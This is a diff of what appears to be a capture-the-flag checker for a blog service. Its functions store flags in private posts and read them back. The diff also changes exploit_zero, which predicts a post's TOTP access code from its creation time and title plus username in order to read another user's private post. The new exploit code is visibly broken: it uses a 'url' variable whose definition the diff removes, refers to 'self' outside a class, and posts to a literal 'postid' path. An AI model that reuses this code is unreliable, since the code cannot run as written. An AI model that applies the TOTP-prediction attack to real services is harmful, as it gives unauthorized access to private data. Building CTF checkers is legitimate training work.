@@ -103,21 +103,23 @@ async def login_user(task, client, logger, username, password):
     assert_equals(r.status_code, 302, "Login Error in login_user function.")
     return r.cookies
 
-async def create_blogpost(client, cookie, flag, is_private):
+async def create_blogpost(client, cookie, flag, is_private, is_hidden, inviteduser):
     title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
     body = flag
-    formdata = None
     inviteduser = ""
+    formdata = {"title": title, "body": body, "inviteuser": inviteduser}
     if is_private:
-        private = "True"
-        formdata = {"title": title, "body": body, "private": private, "inviteuser": inviteduser}
-    else:
-        formdata = {"title": title, "body": body, "inviteuser": inviteduser}
+        formdata["is_private"] = "True"
+
+    if is_hidden:
+        formdata["is_hidden"] = "True"
 
     r = await client.post("/create", data=formdata, cookies=cookie)
-    #follow redirect
+    # follow redirect
     f = await client.get(r.headers['Location'], cookies=cookie)
     assert_equals(r.status_code, 302, "Blogpost creation error in create_blogpost function.")
+
+    # parse html to get the post_id
     html = BeautifulSoup(f.text, "html.parser")
     article = html.find('article', attrs={"class":"post"})
     el_a = article.find('a', attrs={"class":"action"})
@@ -125,6 +127,7 @@ async def create_blogpost(client, cookie, flag, is_private):
 
     return title, postid
 
+# Deposit a flag in a private user post.
 @checker.putflag(0)
 async def putflag_zero(
     task: PutflagCheckerTaskMessage,
@@ -142,7 +145,7 @@ async def putflag_zero(
     flag = task.flag
     username, password, secret = await register_user(task, client, logger)
     cookie = await login_user(task, client, logger, username, password)
-    title, postid = await create_blogpost(client,  cookie, flag, True) #True makes blogpost private
+    title, postid = await create_blogpost(client, cookie, flag, is_private=True, is_hidden=False, inviteduser="")
 
     await db.set("nec_info", (username, password, secret, title, postid))
     attackinfo = {"title": title, "postid": postid}
@@ -166,7 +169,8 @@ async def getflag_zero(
     except KeyError:
         #is mumble here correct or will lead to deduction in points?
         raise MumbleException("Missing database entry from putflag operation.")
-    cookie = await login_user(task, client, logger, userdata[0], userdata[1])
+
+    cookie = await login_user(task, client, logger, username=userdata[0], password=userdata[1])
     url ="/auth/accessblogpost/" + userdata[4]
     r = await client.get(url, cookies=cookie)
     assert_equals(r.status_code, 200, "error when getting blogpost")
@@ -193,17 +197,17 @@ def find_params(r, username, postid):
 def convert_str_to_unixtimestamp(timestr: str):
     date, timec = timestr.split(' ', 1)
     datecomp=date.split('-')
-    timec = timec.split('.', 1)[0]
+    #timec = timec.split('.', 1)[0]
     timecomp=timec.split(':')
-    #create new aware datetime object from date and time components
+    #create new aware datetime object from date and time components, note that we do not have seconds.
     dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), tzinfo=timezone.utc)
-    print("returning")
     return dto.timestamp()
 
 @checker.exploit(0)
 async def exploit_zero(task: ExploitCheckerTaskMessage,
                        searcher: FlagSearcher,
-                       client: AsyncClient
+                       client: AsyncClient,
+                       logger: LoggerAdapter
                        ) -> Optional[str]:
     """
     TODO:
@@ -215,28 +219,31 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
             - calculating the totp.
     """
     if task.attack_info == "":
-        raise InternalErrorException("Missing attack info")
+        raise InternalErrorException("Missing attack info for exploit")
     attackinfo = task.attack_info
     title = attackinfo['title']
     postid = attackinfo['postid']
 
-    username, password, secret = await register_user(task, client)
-    cookie = await login_user(task, client, username, password)
+    username, password, secret = await register_user(task, client, logger)
+    cookie = await login_user(task, client,logger, username, password)
 
-    url = "http://" + task.address + str(SERVICE_PORT) + "/"
-    r = await client.get(url, cookies=cookie)
-
-    time = find_params(r, username, postid)
-    timestamp = convert_str_to_unixtimestamp(time)
-    timestamp_plus = int(timestamp) + 30
+    #access the index, identify post through unique title and gather necessary infos
+    r = await client.get("/", cookies=cookie)
     postkey = title + username
-    totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(postkey)
-    totp_device.calculate_current_timestep_count()
-    usercode = totp_device.generate_otp(self.secret_key, self.timestep_counter)
+    time = find_params(r, username, postid)
+    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
+    timestamp = convert_str_to_unixtimestamp(time)
+    for i in range(2):
+        totp_device = Totp_Client(init_time=timestamp)
+        totp_device.generate_shared_secret(postkey)
+        totp_device.calculate_current_timestep_count()
+        usercode = totp_device.generate_otp(self.secret_key, self.timestep_counter)
+        url = url + "auth/accessblogpost/postid"
+        r = await client.post(url, json={"code":usercode}, cookies=cookie)
+        if r.status_code == 200:
+            break
+        timestamp = int(timestamp) + 30
 
-    url = url + "auth/accessblogpost/postid"
-    r = await client.post(url, json={"code":usercode}, cookies=cookie)
     assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
     assert_in(task.flag, r.text, "flag was not found in blogpost")
     return
